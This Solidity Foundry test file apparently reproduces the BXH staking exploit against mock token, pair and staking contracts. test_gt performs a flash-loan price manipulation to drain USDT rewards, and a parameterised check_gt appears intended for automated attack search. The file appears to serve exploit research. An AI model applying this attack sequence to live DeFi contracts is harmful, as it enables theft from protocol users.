// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./BXH.sol";
import "./BXHStaking.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BXHTestBase is Test, BlockLoader {
    BXH bxh;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    BXHStaking bxhstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bxhAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address bxhstakingAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1664374995;
    uint112 reserve0pair = 25147468936549224419158;
    uint112 reserve1pair = 150042582869434191452532;
    uint32 blockTimestampLastpair = 1664360756;
    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
    uint256 price0CumulativeLastpair =
        1658542015723059495128658895585784161862152;
    uint256 price1CumulativeLastpair =
        32126006449291447357830235525583796774104;
    uint256 totalSupplybxh = 124962294544563937586572816;
    uint256 balanceOfbxhpair = 150042582869434191452532;
    uint256 balanceOfbxhattacker = 0;
    uint256 balanceOfbxhbxhstaking = 0;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 25147468936549224419158;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;

    function setUp() public {
        owner = address(this);
        bxh = new BXH();
        bxhAddr = address(bxh);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(bxh),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        bxhstaking = new BXHStaking(
            address(bxh),
            1 ether,
            block.timestamp,
            1000,
            owner,
            address(usdt),
            address(pair)
        );
        bxhstakingAddr = address(bxhstaking);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bxh.transfer(address(pair), balanceOfbxhpair);
        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
        usdt.transfer(address(bxhstaking), 200000 ether);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bxh Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
        emit log_string("");
        emit log_string("Bxhstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bxhstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(bxhstaking),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(attacker),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_bxh_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bxh_owner(uint256 amount) internal eurus {
        bxh.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_bxh_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bxh_pair(uint256 amount) internal eurus {
        bxh.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_bxh(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_bxh_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        bxh.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_bxhstaking_bxh_bxhslp(uint256 amount) internal eurus {
        bxh.approve(address(bxhstaking), amount);
        bxhstaking.deposit(0, amount);
    }

    function withdraw_bxhstaking_bxhslp_usdt(uint256 amount) internal eurus {
        bxhstaking.deposit(0, 0);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(3110000e18);
        printBalance("After step0 ");
        swap_pair_attacker_usdt_bxh(
            3110000e18,
            pair.getAmountOut(3110000e18, address(usdt))
        );
        printBalance("After step1 ");
        deposit_bxhstaking_bxh_bxhslp(5582e18);
        printBalance("After step2 ");
        withdraw_bxhstaking_bxhslp_usdt(0);
        printBalance("After step3 ");
        swap_pair_attacker_bxh_usdt(
            bxh.balanceOf(attacker),
            pair.getAmountOut(bxh.balanceOf(attacker), address(bxh))
        );
        printBalance("After step4 ");
        payback_usdt_owner((3110000e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_bxh_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
